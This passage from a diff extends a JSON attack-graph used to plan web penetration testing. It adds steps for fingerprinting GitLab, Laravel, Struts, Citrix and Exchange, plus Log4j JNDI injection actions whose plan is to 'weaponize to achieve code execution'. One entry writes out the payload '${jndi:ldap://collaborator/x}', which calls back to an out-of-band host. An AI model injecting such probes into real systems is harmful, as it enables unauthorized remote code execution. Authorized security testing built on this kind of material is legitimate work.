+          "outcome_id": "gitlab",
+          "observation": "GitLab signatures detected.",
+          "likelihood": "rare",
+          "to_state": "gitlab_identified",
+          "note": null
+        },
+        {
+          "outcome_id": "laravel",
+          "observation": "Laravel debug/Ignition signatures detected.",
+          "likelihood": "rare",
+          "to_state": "laravel_debug_identified",
+          "note": null
+        },
+        {
+          "outcome_id": "struts",
+          "observation": "Apache Struts 2 signatures detected.",
+          "likelihood": "rare",
+          "to_state": "struts_identified",
+          "note": null
+        },
+        {
+          "outcome_id": "citrix",
+          "observation": "Citrix ADC/Gateway portal detected.",
+          "likelihood": "rare",
+          "to_state": "citrix_adc_identified",
+          "note": null
+        },
+        {
+          "outcome_id": "exchange",
+          "observation": "Exchange OWA/ECP portal detected.",
+          "likelihood": "rare",
+          "to_state": "exchange_identified",
+          "note": null
+        },
+        {
+          "outcome_id": "unrecognized",
+          "observation": "No specific fingerprinted technology matches a known chain.",
+          "likelihood": "likely",
+          "to_state": "web_target_identified",
+          "note": "Fall back to the generic vulnerability-class testing chains."
+        }
+      ],
+      "is_bridge": true
+    },
+    {
       "action_id": "graphql_abuse_step1",
       "from_state": "api_target_identified",
       "action": "Send an introspection query to enumerate the full schema",
@@ -5227,6 +7336,62 @@
           "note": "Pivot: try a different parameter/endpoint for this technique, or move to another vulnerability class from the entry state."
         }
       ]
+    },
+    {
+      "action_id": "log4j_jndi_injection_api",
+      "from_state": "api_target_identified",
+      "action": "Inject JNDI lookup probes into all reachable API input points and monitor for an out-of-band callback, then weaponize to achieve code execution.",
+      "technique": "blind JNDI injection",
+      "tools": [
+        "interactsh",
+        "log4j-scan"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "OOB callback received and class-loading payload executes.",
+          "likelihood": "rare",
+          "to_state": "log4j_jndi_rce_confirmed",
+          "note": null
+        },
+        {
+          "outcome_id": "failure",
+          "observation": "No callback observed across probed input points.",
+          "likelihood": "likely",
+          "to_state": "log4j_rce_ruled_out",
+          "note": null
+        }
+      ],
+      "is_bridge": true
+    },
+    {
+      "action_id": "log4j_jndi_injection_web",
+      "from_state": "web_target_identified",
+      "action": "Inject JNDI lookup probes (${jndi:ldap://collaborator/x}) into all reachable input points (headers, params, JSON body fields) and monitor for an out-of-band callback, then weaponize to achieve code execution.",
+      "technique": "blind JNDI injection",
+      "tools": [
+        "interactsh",
+        "log4j-scan"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "OOB callback received and class-loading payload executes.",
+          "likelihood": "rare",
+          "to_state": "log4j_jndi_rce_confirmed",
+          "note": null
+        },
+        {
+          "outcome_id": "failure",
+          "observation": "No callback observed across probed input points.",
+          "likelihood": "likely",
+          "to_state": "log4j_rce_ruled_out",
+          "note": "Log4j is not in use, is patched, or the vulnerable code path is not reachable from any tested input."
+        }
+      ],
+      "is_bridge": true
     },
     {
       "action_id": "mass_assignment_step1",
